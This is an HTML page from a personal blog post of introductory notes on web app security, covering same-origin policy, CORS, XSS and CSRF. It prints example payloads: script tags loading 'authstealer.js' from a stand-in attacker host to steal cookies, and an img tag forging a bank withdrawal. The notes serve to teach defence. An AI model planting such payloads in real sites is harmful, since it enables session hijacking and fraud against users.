@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Web App Security Notes</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="description" content="This is the blog of Eric Ren">
+    <link rel="canonical" href="http://ericren.me/blog/notes/2015/08/09/web-app-security-notes/">
+
+    <!-- jekyll&#45;assets -->
+    <link type="text/css" rel="stylesheet" href="/assets/main-0e2075d9f7b276a35d2d1095e532c681dc69de2f72ebc12c7ef2b38173f8511c.css">
+<script type="text/javascript" src="/assets/main-2a7be761650e6a7836f53978835c27a21722b600f4fd72e22fb1dd6f4c3e6321.js" async></script>
+
+</head>
+
+    <body>
+
+      <!-- <div class="comments&#45;container"></div> -->
+      <header class="site-header  site-header--plain">
+  <div class="top-bar">
+    <a href="#" class="menu-icon">
+      <i class="fa fa-bars fa-2x"></i>
+    </a>
+
+
+    <nav class="site-top-nav">
+      <a class="site-top-nav--title" href="/">Eric Ren</a>
+      <ul class="site-top-nav--page-links">
+          <li class="page-link">
+            <a href="/">Blog</a>
+          </li>
+      
+        
+      
+        
+            <li class="page-link">
+              <a href="/about/">About</a>
+            </li>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+            <li class="page-link">
+              <a href="/animation/">Animation</a>
+            </li>
+        
+      
+        
+            <li class="page-link">
+              <a href="/code/">Code</a>
+            </li>
+        
+      
+        
+            <li class="page-link">
+              <a href="/music/">Music</a>
+            </li>
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+      </ul>
+    </nav>
+
+    <ul class="social-links--top">
+  <li>
+    <a href="https://github.com/rencire">
+      <span class="fa fa-github fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="https://linkedin.com/pub/eric-ren/27/251/ba4">
+      <span class="fa fa-linkedin fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="mailto:eric@ericren.me">
+      <span class="fa fa-envelope fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="/feed.xml">
+      <span class="fa fa-rss fa-lg"></span>
+    </a>
+  </li>
+</ul>
+
+  </div>
+
+</header>
+
+
+
+
+<div class="post">
+
+  <header class="post-header">
+
+    <div class="post-header--plain__info">
+      <div class="post-header-info ">
+        <h1>Web App Security Notes</h1>
+        <p class="snippet"></p>
+        <p class="meta">9 Aug 2015</p>
+      </div>
+    </div>
+  </header>
+
+    <section class="content">
+      <article class="post-content">
+      <p>Here are some of my brief notes on the topic of web app security basics.  Most of the info is paraphrased from the wikipedia links in the References section.</p>
+
+<p>##Same-origin policy and CORS
+<a href="https://en.wikipedia.org/wiki/Same-origin_policy">Same-origin policy</a> states that a web browser permits scripts on one web page to access data on another web page, but only if they have the same ‘origin’.  Origin is a combination of the URI scheme(protocol), hostname, and port number.</p>
+
+<p>In some cases, this policy is too restrictive (e.g. Sites that need to access assets from subdomains). There are a few ways to relax this policy.  One of them is <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">Cross-Origin Resource Sharing (CORS)</a>.</p>
+
+<p>CORS adds some headers to create a simple protocol for allowing cross-origin requests. 
+Browser first sends a request with an <code class="highlighter-rouge">Origin</code> HTTP header like so:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Origin: http://www.mysite.com
+</code></pre>
+</div>
+
+<p>The server than responds with an <code class="highlighter-rouge">Access-Control-Allow-Origin (ACAO)</code> header, which indicates which origin sites are allowed:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Access-Control-Allow-Origin: http://www.othersite.com
+</code></pre>
+</div>
+
+<p>ACAO can also look like this:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Access-Control-Allow-Origin: *
+</code></pre>
+</div>
+
+<p>However this is dangerous since it allows any site to access the resources on the server. The wildcard is only appropiate when the server’s response can be completely public (e.g Google Fonts).</p>
+
+<p>NOTE: SOP does not apply to the ‘src’ attribute of images, style, iframe, script elements, forms, etc.</p>
+
+<p>##Cross Site Scripting
+Cross Site Scripting (XSS) vulnerabilities enable attackers to inject client-side scripts into web pages viewed by other users.
+It is one of the most common security vulnerabilites out there on the web.</p>
+
+<p>###Reflected (non-persistent)
+Non-persistent XSS vulnerability is the most common type.  These are caused by data provided by a client (from HTTP query params, HTML forms, etc.) is immediately loaded and parsed by server-side scripts, without sanitizing the data.</p>
+
+<p>A classic example of this type of vulnerability is injecting a script in the search bar.  Usually the URL for a search page has the search term as a query parameter, e.g. <code class="highlighter-rouge">www.example.com/?q=cats</code>.  When the search results load, the page will show something along the lines of: “Search results for ‘cats’”.  If the site does not properly sanitize the query param input, then an attacker can add a payload like so:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>http://www.example.com/?q=cats&lt;script%20src="http://mallorysevilsite.com/authstealer.js"
+</code></pre>
+</div>
+
+<p>The attacker then sends this URL to the victim.  When the victim clicks on the link, “Search results for ‘cats’” will be dipslayed, and in the background the script is processed.</p>
+
+<p>###Persistent
+In a persistent XSS attack, the attacker stores the payload on the server, and the malicious data is permanently displayed for all users to see (and potentially be a victim of). Example: Mallory creates an account on Bob’s website, and finds a stored XSS vulnerability.  She learns that the comments section of a News story will display anything she posts.  And so she posts text like so:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>This is an awesome story!&lt;script src="http://mallorysevilsite.com/authstealer.js"&gt;
+</code></pre>
+</div>
+
+<p>When another user, say Alice, visits the page with Mallory’s comments, the script tag will run and Alice’s authorization cookie will be stolen.</p>
+
+<p>##Cross Site Request Forgery
+<a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">Cross Site Request Forgery (CSRF)</a> is a type of <a href="https://en.wikipedia.org/wiki/Confused_deputy_problem">confused deputy problem</a>.  The attack exploits the website’s trust in the user’s identity by giving unauthorized user commands to the website.  In essence, the ‘confused deputy’ is the Web Browser, since it is confused into misusing Alice’s authority due to Mallory.</p>
+
+<p>Example from wikipedia: 
+Alice is browsing a chat forum when another user Mallory posted a message.  The message contains an <code class="highlighter-rouge">&lt;img&gt;</code> tag with a <code class="highlighter-rouge">src</code> referencing an action on Alice’s bank website.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&lt;img src="http://somebank.com/withdraw?account=Alice&amp;amount=10000000&amp;for=Mallory"&gt;
+</code></pre>
+</div>
+
+<p>If Alice’s cookie contains the bank’s authorization info, then when the browser loads the image, the transaction is authorized without Alice’s approval.</p>
+
+<p>The fundamental difference between XSS and CSRF is that XSS exploits user’s trust in website, whereas CSRF exploits the trust the website has in the victim’s Web browser.</p>
+
+<p>#References
+https://en.wikipedia.org/wiki/Cross-site_request_forgery
+https://en.wikipedia.org/wiki/Same-origin_policy
+https://en.wikipedia.org/wiki/Cross-origin_resource_sharing</p>
+
+<p>http://schock.net/articles/2013/07/03/hosting-web-fonts-on-a-cdn-youre-going-to-need-some-cors/</p>
+
+      </article>
+    </section>
+
+  <!-- add animation to switch between prev and next article -->
+  <footer class="post-footer">
+
+    
+
+    
+
+    
+      <div class="post-preview--next post-preview--half ">
+  <div class="post-preview__bg-image" style="background-image: url(' /images/wall_2.JPG  '); ">
+    <!-- nothing here!  -->
+  </div>
+
+  <div class="post-preview__info">
+    <div class="post-preview-info clean">
+      <p>Newer Post &rarr;</p>
+      <a href="/blog/notes/2016/01/13/simple-static-server-with-elixir-and-plug/ " class="next-post-link">
+        <h1>Simple Static Server With Elixir And Plug</h1>
+        <p class="snippet"></p>
+      </a>
+    </div>
+  </div>
+</div>
+
+    
+
+
+    
+      <div class="post-preview--prev post-preview--half ">
+  <div class="post-preview__bg-image" style="background-image: url(' /images/cave_view.JPG  '); ">
+    <!-- nothing here!  -->
+  </div>
+
+  <div class="post-preview__info">
+    <div class="post-preview-info clean">
+      <p> &larr; Older Post</p>
+      <a href="/blog/2014/10/06/move-to-jekyll/ " class="next-post-link">
+        <h1>A New Beginning</h1>
+        <p class="snippet">Moving to a new Jekyll site</p>
+      </a>
+    </div>
+  </div>
+</div>
+
+    
+
+
+  </footer>
+
+</div>
+
+
+
+
+      <div class="main-overlay"></div>
+
+      <aside class="aside-nav light">
+  <a href="#" class="close-menu-icon">
+    <i class="fa fa-times fa-2x"></i>
+  </a>
+  <a class="site-title" href="/">Eric Ren</a>
+  <ul class="page-links">
+    <li>
+      <a href="/">
+        <div class="page-link--img" style="background-image: url('/images/wall_2.JPG');">
+          <h1>Blog</h1>
+        </div>
+      </a>
+      <p class="page-link--desc">Ramblings</p>
+    </li>
+    
+      
+    
+      
+        <li>
+          <a href="/about/">
+            <div class="page-link--img" style="background-image: url('/images/wall_12.JPG');">
+              <h1>About</h1>
+            </div>
+          </a>
+          <p class="page-link--desc">Get to know more about me</p>
+        </li>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <li>
+          <a href="/animation/">
+            <div class="page-link--img" style="background-image: url('/images/wall_7.JPG');">
+              <h1>Animation</h1>
+            </div>
+          </a>
+          <p class="page-link--desc">Animated shorts</p>
+        </li>
+      
+    
+      
+        <li>
+          <a href="/code/">
+            <div class="page-link--img" style="background-image: url('/images/wall_8.JPG');">
+              <h1>Code</h1>
+            </div>
+          </a>
+          <p class="page-link--desc">Coding projects</p>
+        </li>
+      
+    
+      
+        <li>
+          <a href="/music/">
+            <div class="page-link--img" style="background-image: url('/images/wall_9.JPG');">
+              <h1>Music</h1>
+            </div>
+          </a>
+          <p class="page-link--desc">Poetry for the ears</p>
+        </li>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </ul>
+
+  <ul class="social-links--nav">
+  <li>
+    <a href="https://github.com/rencire">
+      <span class="fa fa-github fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="https://linkedin.com/pub/eric-ren/27/251/ba4">
+      <span class="fa fa-linkedin fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="mailto:eric@ericren.me">
+      <span class="fa fa-envelope fa-lg"></span>
+    </a>
+  </li>
+  <li>
+    <a href="/feed.xml">
+      <span class="fa fa-rss fa-lg"></span>
+    </a>
+  </li>
+</ul>
+
+</aside>
+
+
+
+    </body>
+</html>
